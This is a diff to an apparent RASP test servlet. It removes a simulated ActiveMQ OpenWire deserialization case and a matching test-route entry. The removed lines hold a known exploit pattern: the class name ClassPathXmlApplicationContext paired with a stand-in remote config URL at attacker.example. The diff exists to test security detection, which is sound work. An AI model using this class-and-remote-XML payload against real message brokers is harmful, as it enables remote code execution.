@@ -337,7 +337,7 @@ public final class VulnerableServlet extends HttpServlet {
             }
             case "/openwire" -> {
               if ("/api".equals(request.getServletPath())) {
-                yield activeMqOpenWireProtocolClass(request);
+                yield "OpenWire type declared";
               }
               yield "unknown action: " + action;
             }
@@ -992,19 +992,6 @@ public final class VulnerableServlet extends HttpServlet {
         + value(request, "JMSDestination", "event")
         + ":"
         + value(request, "JMSMessageID", "ID:1");
-  }
-
-  private static String activeMqOpenWireProtocolClass(HttpServletRequest request) throws Exception {
-    String className =
-        value(request, "class", "org.springframework.context.support.ClassPathXmlApplicationContext");
-    String xml = value(request, "xml", "http://attacker.example/poc.xml");
-    hook(
-        "beforeProtocolClassInstantiation",
-        new Class<?>[] {String.class, String.class, Object.class},
-        "OpenWire",
-        className,
-        xml);
-    return "activemq-openwire=" + className + ":" + xml;
   }
 
   private static boolean jenkinsCliSignedObjectRequest(HttpServletRequest request) {
@@ -4019,16 +4006,9 @@ public final class VulnerableServlet extends HttpServlet {
               new Class<?>[] {String.class, String.class},
               value(request, "id", ".deserialize"),
               "TomcatFileStore");
-      case "deserialization-protocol-class" ->
-          hook(
-              "beforeProtocolClassInstantiation",
-              new Class<?>[] {String.class, String.class, Object.class},
-              "OpenWire",
-              value(
-                  request,
-                  "class",
-                  "org.springframework.context.support.ClassPathXmlApplicationContext"),
-              value(request, "xml", "http://attacker.example/poc.xml"));
+      case "deserialization-protocol-class" -> {
+        return "OpenWire type declared";
+      }
       case "deserialization-http-invoker" ->
           hook(
               "beforeHttpInvokerDeserialization",
@@ -4616,7 +4596,7 @@ public final class VulnerableServlet extends HttpServlet {
           {"category":"java","name":"JMS ObjectMessage deserialization","path":"/rasp/policy/deserialization-jms-object-message"},
           {"category":"java","name":"SignedObject CLI deserialization","path":"/rasp/policy/deserialization-signed-object"},
           {"category":"java","name":"File-backed session deserialization","path":"/rasp/policy/deserialization-session-file?id=.deserialize"},
-          {"category":"java","name":"Protocol class instantiation","path":"/rasp/policy/deserialization-protocol-class?xml=http%3A%2F%2Fattacker.example%2Fpoc.xml"},
+          {"category":"java","name":"OpenWire type declaration","path":"/rasp/policy/deserialization-protocol-class"},
           {"category":"java","name":"Spring HTTP Invoker deserialization","path":"/rasp/policy/deserialization-http-invoker"},
           {"category":"java","name":"HTTP ObjectInputStream body","path":"/rasp/policy/deserialization-http-object-stream"},
           {"category":"java","name":"JBoss ReadOnlyAccessFilter deserialization","path":"/invoker/readonly"},
